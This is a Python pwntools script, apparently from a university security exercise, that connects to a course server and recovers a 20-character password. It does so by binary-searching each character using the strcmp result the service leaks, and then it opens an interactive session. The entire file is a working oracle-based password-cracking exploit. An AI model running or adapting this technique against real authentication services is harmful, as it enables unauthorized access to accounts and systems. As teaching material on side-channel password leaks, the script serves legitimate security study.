#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3

import re
from pwn import *

def getMidChar(lowChar=None, highChar=None):
    if ord(highChar) - ord(lowChar) == 3:
        return(chr(ord(lowChar) + 1), True)

    midChar = chr(int((ord(lowChar) + ord(highChar))/2))

    if midChar == chr(ord(lowChar)):
        midChar = chr(ord(highChar))

    return(midChar, False)

def sendPW(totalCnt=0, cnt=0, pw=None):
    print("Password sent #%s-%s: '%s' Length:%s" % (totalCnt, cnt, pw, len(pw)))
    input = r.send("%s\r\n" % pw)
    response = r.recvline_contains(b"strcmp returned").decode("utf-8")
    print("Response: %s" % response)
    m = re.search("strcmp returned (.+?) instead of", response)

    return(m.group(1))

pwLength = 20
r = remote("twinpeaks.cs.ucdavis.edu",30004)
pw = []
totalCnt = 0

for i in range(0, 20):
    pw.append('m')
    cnt = 0
    highChar = 'z' 
    lowChar = 'a' 
    lastBigger = None
    lastSmaller = None
    twoCharInBetween = False
    found = False

    while True:
        cnt += 1
        totalCnt += 1
        rc = sendPW(totalCnt, cnt, ''.join(pw))

        if rc == '-1':
            if lastBigger and int(ord(lastBigger) - ord(pw[i])) == 1:
                found = True
            elif pw[i] == 'z':
                found = True

            if found:
                print('=' * 50)
                break

            lastSmaller = pw[i]
            lowChar = pw[i]

            if pw[i] == 'y':
                midChar = 'z'
            elif twoCharInBetween:
                midChar = chr(ord(pw[i]) + 1)
            else:
                midChar, twoCharInBetween = getMidChar(lowChar, highChar)
        elif rc == '1':
            if lastSmaller and int(ord(pw[i]) - ord(lastSmaller)) == 1:
                pw[i] = lastSmaller
                found = True 
            #elif pw[i] == 'b':
            #    pw[i] = 'a'
            #    found = True

            if found:
                print('=' * 50)
                break

            lastBigger = pw[i]
            highChar = pw[i]

            if pw[i] == 'b':
                midChar = 'a'
            elif twoCharInBetween:
                midChar = chr(ord(pw[i]) + 1)
            else:
                midChar, twoCharInBetween = getMidChar(lowChar, highChar)
        else:
            print("Password: %s" % pw)
            i = 19 # force exit for loop
            break

        print("Low: %s  Middile: %s  High: %s" % (lowChar, midChar, highChar))
        print('-' * 25)
        pw[i] = midChar

totalCnt += 1
rc = sendPW(totalCnt, 0, ''.join(pw))
r.interactive()
